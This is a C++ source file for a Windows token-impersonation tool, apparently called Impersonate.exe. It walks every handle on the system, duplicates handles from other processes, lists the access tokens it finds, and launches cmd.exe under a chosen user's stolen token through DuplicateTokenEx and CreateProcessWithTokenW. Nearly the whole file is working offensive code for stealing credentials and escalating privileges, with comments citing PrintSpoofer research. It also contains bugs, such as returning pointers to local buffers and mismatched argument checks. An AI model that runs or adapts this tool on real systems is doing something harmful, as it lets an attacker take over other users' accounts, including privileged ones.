#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>
#include <Lm.h>
#include <winternl.h>
#include <winternl.h>
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "ntdll")
#define BUF_SIZE 8112


typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
    USHORT ProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR ObjectTypeIndex;
    UCHAR HandleAttributes;
    USHORT HandleValue;
    PVOID Object;
    ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION {
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
}  SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

typedef NTSTATUS(WINAPI* NTQUERYSYSTEMINFORMATION)(
    DWORD SystemInformationClass,
    PVOID SystemInformation,
    DWORD SystemInformationLength,
    PDWORD ReturnLength
);

typedef enum _POOL_TYPE
{
    NonPagedPool,
    PagedPool,
    NonPagedPoolMustSucceed,
    DontUseThisType,
    NonPagedPoolCacheAligned,
    PagedPoolCacheAligned,
    NonPagedPoolCacheAlignedMustS
} POOL_TYPE, * PPOOL_TYPE;

typedef struct _OBJECT_TYPE_INFORMATION
{
    UNICODE_STRING Name;
    ULONG TotalNumberOfObjects;
    ULONG TotalNumberOfHandles;
    ULONG TotalPagedPoolUsage;
    ULONG TotalNonPagedPoolUsage;
    ULONG TotalNamePoolUsage;
    ULONG TotalHandleTableUsage;
    ULONG HighWaterNumberOfObjects;
    ULONG HighWaterNumberOfHandles;
    ULONG HighWaterPagedPoolUsage;
    ULONG HighWaterNonPagedPoolUsage;
    ULONG HighWaterNamePoolUsage;
    ULONG HighWaterHandleTableUsage;
    ULONG InvalidAttributes;
    GENERIC_MAPPING GenericMapping;
    ULONG ValidAccess;
    BOOLEAN SecurityRequired;
    BOOLEAN MaintainHandleCount;
    USHORT MaintainTypeList;
    POOL_TYPE PoolType;
    ULONG PagedPoolUsage;
    ULONG NonPagedPoolUsage;
} OBJECT_TYPE_INFORMATION, * POBJECT_TYPE_INFORMATION;

typedef NTSTATUS(WINAPI* NTQUERYOBJECT)(
    HANDLE ObjectHandle,
    OBJECT_INFORMATION_CLASS ObjectInformationClass,
    PVOID ObjectInformation,
    DWORD Length,
    PDWORD ResultLength
);

typedef struct _SYSTEM_PROCESS_INFO
{
    ULONG                   NextEntryOffset;
    ULONG                   NumberOfThreads;
    LARGE_INTEGER           Reserved[3];
    LARGE_INTEGER           CreateTime;
    LARGE_INTEGER           UserTime;
    LARGE_INTEGER           KernelTime;
    UNICODE_STRING          ImageName;
    ULONG                   HandleCount;
    ULONG                   BasePriority;
    HANDLE                  ProcessId;
    HANDLE                  InheritedFromProcessId;
}SYSTEM_PROCESS_INFO, * PSYSTEM_PROCESS_INFO;

typedef UNICODE_STRING OBJECT_NAME_INFORMATION;
typedef UNICODE_STRING* POBJECT_NAME_INFORMATION;

#define STATUS_SUCCESS                          ((NTSTATUS)0x00000000L)
#define STATUS_INFO_LENGTH_MISMATCH             ((NTSTATUS)0xC0000004L)
#define STATUS_BUFFER_OVERFLOW                  ((NTSTATUS)0x80000005L)
#define SystemHandleInformation                 16
#define SystemProcessInformation				5
#define SystemHandleInformationSize             1024 * 1024 * 10
#define OB_TYPE_INDEX_TOKEN 4

using fNtQuerySystemInformation = NTSTATUS(WINAPI*)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
    );

// https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/
// https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens
// https://docs.microsoft.com/en-us/windows/win32/secauthz/searching-for-a-sid-in-an-access-token-in-c--
// https://github.com/MScholtes/ThreadInfo/blob/master/ThreadInfo.cpp
// https://stackoverflow.com/questions/59481858/getting-the-number-of-handles-to-a-specific-process

BOOL duplicate_and_launch(HANDLE token, wchar_t* command) {
    // Structures used to hold the structure of the futur process we will launch
    STARTUPINFO si = {};
    PROCESS_INFORMATION pi = {};
    HANDLE duplicated_token;
    DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &duplicated_token);
    SetLastError(0);
    CHAR buf[128];
    CHAR szComp[MAX_PATH], szUser[MAX_PATH];
    DWORD dwSize = MAX_PATH;
    HANDLE thread;
    HANDLE current_thread_token;
    DWORD length_needed, sessionid = 1, returned_length;

    SetThreadToken(NULL, duplicated_token);
    GetUserNameA(szUser, &dwSize);
    printf("[!!!] Impersonated %s\nRunning %ws\n", szUser, command);
    CreateProcessWithTokenW(duplicated_token, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe" , command, 0, NULL, NULL, &si, &pi);
    //CloseHandle(current_thread_token);
    exit(0);
}

wchar_t* get_token_owner_info(HANDLE token) {
    wchar_t username[BUF_SIZE], domain[BUF_SIZE];
    SID_NAME_USE sid;
    DWORD user_length = sizeof(username), domain_length = sizeof(domain);
    HANDLE temp_token;
    BOOL ret;
    TOKEN_OWNER TokenStatisticsInformation;
    DWORD returned_tokinfo_length;
    if (!GetTokenInformation(token, TokenOwner, NULL, 0, &returned_tokinfo_length)) {
        PTOKEN_OWNER TokenStatisticsInformation = (PTOKEN_OWNER)GlobalAlloc(GPTR, returned_tokinfo_length);
        if (GetTokenInformation(token, TokenOwner, TokenStatisticsInformation, returned_tokinfo_length, &returned_tokinfo_length)) {
            // Retrieves username and domain from SID
            if (LookupAccountSidW(NULL, ((TOKEN_OWNER*)TokenStatisticsInformation)->Owner, username, &user_length, domain, &domain_length, &sid) == 0) {
                printf("LookupAccountSidOwner error %d\n", GetLastError());
            }
            wchar_t full_name[50];
            _snwprintf_s(full_name, 50, L"%ws/%ws", domain, username);
            return full_name;
        }
    }
}

wchar_t* get_token_user_info(HANDLE token) {
    wchar_t username[BUF_SIZE], domain[BUF_SIZE];
    SID_NAME_USE sid;
    DWORD user_length = sizeof(username), domain_length = sizeof(domain);
    HANDLE temp_token;
    BOOL ret;
    TOKEN_USER TokenStatisticsInformation;
    DWORD returned_tokinfo_length;

    if (!GetTokenInformation(token, TokenUser, NULL, 0, &returned_tokinfo_length)) {
        PTOKEN_USER TokenStatisticsInformation = (PTOKEN_USER)GlobalAlloc(GPTR, returned_tokinfo_length);
        if (GetTokenInformation(token, TokenUser, TokenStatisticsInformation, returned_tokinfo_length, &returned_tokinfo_length)) {
            // Retrieves username and domain from SID
            if (LookupAccountSidW(NULL, ((TOKEN_USER*)TokenStatisticsInformation)->User.Sid, username, &user_length, domain, &domain_length, &sid) == 0) {
                printf("LookupAccountSidOwner error %d\n", GetLastError());
            }
            wchar_t full_name[50];
            _snwprintf_s(full_name, 50, L"%ws/%ws", domain, username);
            return full_name;
        }
    }
}

BOOL is_impersonate_token(HANDLE token, int pid, wchar_t* target, wchar_t* command) {
    HANDLE temp_token;
    BOOL ret;
    LPVOID TokenStatisticsInformation;
    DWORD returned_tokinfo_length;

    if (!GetTokenInformation(token, TokenStatistics, NULL, 0, &returned_tokinfo_length)) {
        PTOKEN_STATISTICS TokenStatisticsInformation = (PTOKEN_STATISTICS)GlobalAlloc(GPTR, returned_tokinfo_length);
        if (GetTokenInformation(token, TokenStatistics, TokenStatisticsInformation, returned_tokinfo_length, &returned_tokinfo_length)) {
            if (TokenStatisticsInformation->TokenType == TokenImpersonation) {
                wchar_t* token_owner;
                token_owner = get_token_owner_info(token);
                wchar_t* token_user;
                token_user = get_token_user_info(token);
                LPVOID TokenImpersonationInformation = NULL;
                DWORD returned_tokimp_length;
                // printf("[%d Imp token] Owner: %s | User %s\n", pid, token_owner, token_user);
                if (!GetTokenInformation(token, TokenImpersonationLevel, NULL, 0, &returned_tokimp_length)) {
                    PSECURITY_IMPERSONATION_LEVEL TokenImpersonationInformation = (PSECURITY_IMPERSONATION_LEVEL)GlobalAlloc(GPTR, returned_tokimp_length);
                    if (GetTokenInformation(token, TokenImpersonationLevel, TokenImpersonationInformation, returned_tokimp_length, &returned_tokimp_length)) {
                        if (*((SECURITY_IMPERSONATION_LEVEL*)TokenImpersonationInformation) == SecurityImpersonation) {
                            printf("[%d Impersonate token] Owner: %ws | User %ws\n", pid, token_owner, token_user);
                        }
                        if (*((SECURITY_IMPERSONATION_LEVEL*)TokenImpersonationInformation) == SecurityDelegation) {
                            printf("[%d Delegation token] Owner: %ws | User %ws\n", pid, token_owner, token_user);
                        }
                        if (*((SECURITY_IMPERSONATION_LEVEL*)TokenImpersonationInformation) == SecurityAnonymous) {
                            printf("[%d Anonymous token] Owner: %ws | User %ws\n", pid, token_owner, token_user);
                        }
                        if (*((SECURITY_IMPERSONATION_LEVEL*)TokenImpersonationInformation) == SecurityIdentification) {
                            printf("[%d Identification token] Owner: %ws | User %ws\n", pid, token_owner, token_user);
                        }
                    }
                }
                else {
                    printf("wrong alloc");
                }
                if (wcscmp(target, L"") != 0) {
                    if (wcscmp(token_user, target) == 0) {
                        printf("[!] Found target token!\n");
                        duplicate_and_launch(token, command);
                    }
                }
            }
        }
        else {
            printf("IsImpersonatetoken: %d %d\n", pid, GetLastError());
            return FALSE;
        }
    }
    return FALSE;
}

BOOL is_primary_token(HANDLE token, int pid, wchar_t* target, wchar_t* command) {
    HANDLE temp_token;
    BOOL ret;
    TOKEN_STATISTICS TokenStatisticsInformation;
    DWORD returned_tokinfo_length;

    if (!GetTokenInformation(token, TokenStatistics, NULL, 0, &returned_tokinfo_length)) {
        PTOKEN_STATISTICS TokenStatisticsInformation = (PTOKEN_STATISTICS)GlobalAlloc(GPTR, returned_tokinfo_length);
        if (GetTokenInformation(token, TokenStatistics, TokenStatisticsInformation, returned_tokinfo_length, &returned_tokinfo_length)) {
            if (TokenStatisticsInformation->TokenType == TokenPrimary) {
                wchar_t* token_owner;
                token_owner = get_token_owner_info(token);
                wchar_t* token_user;
                token_user = get_token_user_info(token);
                printf("[%d Primary token] Owner: %ws | User %ws\n", pid, token_owner, token_user);
                if (wcscmp(target, L"") != 0) {
                    if (wcscmp(token_user, target) == 0) {
                        printf("[!] Found target token!");
                        duplicate_and_launch(token, command);
                    }
                }
                return TRUE;
            }
        }
        else {
            printf("IsPrimarytoken: %d %d\n", pid, GetLastError());
            return FALSE;
        }
    }
}

LPWSTR GetObjectInfo(HANDLE hObject, OBJECT_INFORMATION_CLASS objInfoClass){
    LPWSTR data = NULL;
    DWORD dwSize = sizeof(OBJECT_NAME_INFORMATION);
    POBJECT_NAME_INFORMATION pObjectInfo = (POBJECT_NAME_INFORMATION)malloc(dwSize);

    NTSTATUS ntReturn = NtQueryObject(hObject, objInfoClass, pObjectInfo, dwSize, &dwSize);
    if ((ntReturn == STATUS_BUFFER_OVERFLOW) || (ntReturn == STATUS_INFO_LENGTH_MISMATCH)) {
        pObjectInfo = (POBJECT_NAME_INFORMATION)realloc(pObjectInfo, dwSize);
        ntReturn = NtQueryObject(hObject, objInfoClass, pObjectInfo, dwSize, &dwSize);
    }
    if ((ntReturn >= STATUS_SUCCESS) && (pObjectInfo->Buffer != NULL)) {
        data = (LPWSTR)calloc(pObjectInfo->Length, sizeof(WCHAR));
        CopyMemory(data, pObjectInfo->Buffer, pObjectInfo->Length);
    }
    free(pObjectInfo);
    return data;
}

int wmain(int argc, wchar_t* argv[]) {

    if (argc != 2) {
        printf("List available tokens: Impersonate.exe\n");
        printf("Impersonate user: Impersonate.exe DOMAIN/username\n");
    }

    wchar_t target[50];
    wchar_t command[256];
    if (argc == 3) {
        wcscpy_s(target, 50, argv[1]);
        wcscpy_s(command, 50, argv[2]);
        printf("[*] Targetting user: [%ws]\n", target);
    }
    else {
        wcscpy_s(target, 50, L"");
        printf("[*] Listing available tokens\n");
    }

    NTSTATUS status;
    PVOID buffer;
    PSYSTEM_PROCESS_INFO spi;

    // https://github.com/adamkramer/handle_monitor/blob/master/handle_monitor.cpp
    //printf("\nProcess list allocated at address %#x\n", buffer);
    ULONG returnLenght = 0;
    fNtQuerySystemInformation NtQuerySystemInformation = (fNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"ntdll"), "NtQuerySystemInformation");
    PSYSTEM_HANDLE_INFORMATION handleTableInformation = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, SystemHandleInformationSize);
    NtQuerySystemInformation(SystemHandleInformation, handleTableInformation, SystemHandleInformationSize, &returnLenght);
    printf("Found %lu handles systemwirld\n", handleTableInformation->NumberOfHandles);
    for (DWORD i = 0; i < handleTableInformation->NumberOfHandles; i++) {
        SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)handleTableInformation->Handles[i];
        HANDLE dupHandle = NULL;
        HANDLE process;
        
   
        process = OpenProcess(PROCESS_DUP_HANDLE, FALSE, handleInfo.ProcessId);
        if (process == INVALID_HANDLE_VALUE) {
            CloseHandle(process);
            continue;
        }

        /* Duplicate the handle so we can query it. */
        if (DuplicateHandle(process, (HANDLE)handleInfo.HandleValue, GetCurrentProcess(), &dupHandle, 0, FALSE, DUPLICATE_SAME_ACCESS) == 0) {
            CloseHandle(process);
            CloseHandle(dupHandle);
            continue;
        }

        POBJECT_TYPE_INFORMATION objectTypeInfo = (POBJECT_TYPE_INFORMATION)malloc(8112);
        LPWSTR lpwsType = NULL;
        lpwsType = GetObjectInfo(dupHandle, ObjectTypeInformation);

        if (wcscmp(lpwsType, L"Token"))
        {
            CloseHandle(process);
            CloseHandle(dupHandle);
            continue;
        }

        is_impersonate_token(dupHandle, handleInfo.ProcessId, target, command);
        is_primary_token(dupHandle, handleInfo.ProcessId, target, command);
        CloseHandle(process);
        CloseHandle(dupHandle);
    }
    return 0;
}